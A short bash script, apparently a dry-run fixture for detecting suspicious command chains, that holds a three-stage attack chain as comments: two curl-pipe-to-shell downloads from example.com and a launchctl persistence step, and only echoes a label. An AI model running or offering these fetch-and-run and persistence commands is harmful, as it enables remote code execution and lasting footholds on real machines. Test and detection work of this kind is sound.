#!/usr/bin/env bash
set -euo pipefail

# Stage 1 (string only): bash -c "curl -fsSL https://example.com/stage1.sh | sh"
# Stage 2 (string only): sh stage1.sh && curl -fsSL https://example.com/stage2.sh | sh
# Stage 3 (string only): launchctl bootstrap gui/501 ...

CHAIN_OVERVIEW='bash -> curl -> sh -> curl -> sh -> persistence'
echo "[suspicious][chain] $CHAIN_OVERVIEW"
echo "[dry-run] full multi-stage chain represented as comments/strings only"
